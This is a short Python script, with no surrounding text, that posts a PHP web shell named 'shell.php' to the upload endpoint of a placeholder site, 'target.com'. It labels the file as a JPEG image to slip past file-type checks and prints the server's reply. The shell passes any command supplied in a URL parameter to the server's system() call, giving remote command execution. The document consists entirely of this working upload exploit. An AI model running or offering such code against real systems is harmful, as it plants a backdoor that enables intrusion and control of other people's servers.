import requests

url = "http://target.com/upload"
files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>', 'image/jpeg')}
r = requests.post(url, files=files)
print(r.text)